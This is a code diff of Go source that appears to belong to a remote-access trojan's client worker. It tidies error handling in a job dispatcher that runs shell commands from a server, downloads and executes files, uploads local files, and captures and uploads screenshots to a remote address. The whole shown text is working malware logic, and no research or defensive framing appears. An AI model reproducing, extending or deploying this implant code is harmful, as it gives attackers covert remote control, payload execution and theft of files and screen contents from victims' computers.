@@ -121,7 +121,6 @@ func (w *Worker) poll() {
 func (w *Worker) resolve(job *Job) {
 	todo, args := job.parse()
 	fmt.Println(job.Todo)
-	var err error
 	switch todo {
 	case SHELL_CMD:
 		w.report(job.Id, win.ExecuteCommand(args...))
@@ -130,41 +129,48 @@ func (w *Worker) resolve(job *Job) {
 		w.report(job.Id, "Boost mode changed.")
 	case SLEEP:
 		val, err := strconv.Atoi(args[0])
-		if err == nil {
-			w.report(job.Id, "Sleeping for "+args[0]+" seconds.")
-			time.Sleep(time.Duration(val) * time.Second)
+		if err != nil {
+			w.report(job.Id, err.Error())
+			return
 		}
+		w.report(job.Id, "Sleeping for "+args[0]+" seconds.")
+		time.Sleep(time.Duration(val) * time.Second)
 	case DOWNLOAD:
-		err = win.DownloadNExecute(args[0], args[1])
-		if err == nil {
-			w.report(job.Id, "File downloaded and executed.")
+		if err := win.DownloadNExecute(args[0], args[1]); err != nil {
+			w.report(job.Id, err.Error())
+			return
 		}
+		w.report(job.Id, "File downloaded and executed.")
 	case UPLOAD:
 		loc, err := utils.UploadFile(args[0], fmt.Sprintf(UPLOADS_URL, w.id))
-		if err == nil {
-			w.report(job.Id, "File uploaded to "+path.Join(SERVER_ADDR, loc))
+		if err != nil {
+			w.report(job.Id, err.Error())
+			return
 		}
+		w.report(job.Id, "File uploaded to "+path.Join(SERVER_ADDR, loc))
 	case CHDIR:
-		err = os.Chdir(args[0])
-		if err == nil {
-			w.report(job.Id, "Directory changed to "+args[0])
+		if err := os.Chdir(args[0]); err != nil {
+			w.report(job.Id, err.Error())
+			return
 		}
-	case MSG_BOX:
+		w.report(job.Id, "Directory changed to "+args[0])
+	case MSG:
 		win.ShowInfoDialog(args[0], args[1])
 		w.report(job.Id, "Message shown successfully.")
 	case SCREENSHOT:
 		img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(0))
-		if err == nil {
-			loc, err := utils.UploadImage(img, "screen", fmt.Sprintf(UPLOADS_URL, w.id))
-			if err == nil {
-				w.report(job.Id, "Screenshot uploaded to "+path.Join(SERVER_ADDR, loc))
-			}
+		if err != nil {
+			w.report(job.Id, err.Error())
+			return
 		}
+		loc, err := utils.UploadImage(img, "screen", fmt.Sprintf(UPLOADS_URL, w.id))
+		if err != nil {
+			w.report(job.Id, err.Error())
+			return
+		}
+		w.report(job.Id, "Screenshot uploaded to "+path.Join(SERVER_ADDR, loc))
 	case UNKNOWN:
 		w.report(job.Id, "Received job has wrong format.")
-	}
-	if err != nil {
-		w.report(job.Id, err.Error())
 	}
 }
 
